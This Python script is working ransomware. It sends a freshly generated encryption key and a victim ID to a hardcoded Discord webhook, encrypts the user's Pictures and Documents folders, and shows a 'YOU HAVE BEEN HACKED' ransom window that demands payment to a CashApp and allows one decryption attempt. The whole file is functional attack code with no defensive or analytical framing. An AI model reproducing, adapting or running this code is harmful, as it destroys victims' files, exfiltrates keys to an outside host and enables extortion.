import os
import sys
import getpass
import tkinter as tk
from cryptography.fernet import Fernet
from discord_webhook import DiscordWebhook
from random import randint
from tkinter import W, messagebox
# imports needed libraries


webhook_url = "https://discord.com/api/webhooks/794012239848931328/mFKDjVAoXyKXQ2AC1lKQQzd9UbpSECT7e9hYmWSrsDwlsAnFavshnTr5zAbbKBd1FXNs"
user = getpass.getuser()
target_paths = [f"C:\\Users\\{user}\\Pictures", f"C:\\Users\\{user}\\Documents"]
ID_range = 1000000
# defines variables that effect the system targeting


def get_key():  # generates a unique Fernet key
   key = Fernet.generate_key()

   ID = str(randint(0, ID_range))
   message = ID + ": " + str(key)

   webhook = DiscordWebhook(url=webhook_url, content=message)
   response = webhook.execute()
   # senns message with victim ID and key to a Discord webhook

   return Fernet(key), ID


def encrypt(mode, dir_paths, frn):  # encrypts or decrypts files
   for dir_path in dir_paths:

      try:
         for root, dirs, files in os.walk(dir_path):
            for name in files:

               try:
                  if name[-3:].lower() != "exe":
                     path = os.path.join(root, name)

                     f = open(path, "rb")
                     data = f.read()
                     f.close()
                     # gets current file data
                     
                     if mode:  # encrypts or decrypts data
                        encrypted_data = frn.encrypt(data)
                     else:
                        encrypted_data = frn.decrypt(data)

                     f = open(path, "wb")
                     f.write(encrypted_data)
                     f.close()
                     # writes new file data

               except:  # if a bizarre file name error comes up, the program will continue as normal
                  pass

      except:  # if a there is a directory failure, the program will not fail
         pass


def entry_manager(text):  # manages the system after user entry
   try:
      encrypt(False, target_paths, Fernet(text.encode('ascii')))
      messagebox.showinfo("Success", "Success\nThank you for your cooperation")
   except:
      messagebox.showerror("Incorrect Code", "Incorrect Code")
   
   sys.exit()


def centerWindow(myRoot, width, height):  # centers window with a specific size
    screen_width = myRoot.winfo_screenwidth()
    screen_height = myRoot.winfo_screenheight()

    x = (screen_width / 2) - (width / 2)
    y = (screen_height / 2) - (height / 2)
    myRoot.geometry('%dx%d+%d+%d' % (width, height, x, y))


def show_window(ID):  # shows display window
   root = tk.Tk()
   root.title("!!! IMPORTANT !!!")
   root.lift()
   centerWindow(root, 770, 200)

   title_label = tk.Label(root, text="DO NOT CLOSE THIS WINDOW OR ALL PICTURES/DOCUMENTS WILL BE LOST - YOU HAVE BEEN HACKED!", foreground="red", font=("Arial", 11))
   info_label = tk.Label(root, text=f"Send the sum of $0 immediately to this CashApp: (Null) with this unique ID as your message: {ID}", font=("Arial", 10))
   decode_label = tk.Label(root, text="Enter the decoder here.  After one try, the system will shut down:", font=("Arial", 10))
   # creates text displays

   entry = tk.Entry(width=50)
   button = tk.Button(root, text="Enter", command=lambda: entry_manager(entry.get().strip()))

   title_label.grid(row=0, column=0, stick=W)
   info_label.grid(row=1, column=0, stick=W)
   decode_label.grid(row=2, column=0, pady=(20, 0), stick=W)
   entry.grid(row=3, column=0, padx=5, stick=W)
   button.grid(row=4, column=0, padx=5, stick=W)
   # styles displays

   root.mainloop() 


frn, ID = get_key()
encrypt(True, target_paths, frn)
show_window(ID)
# runs program parts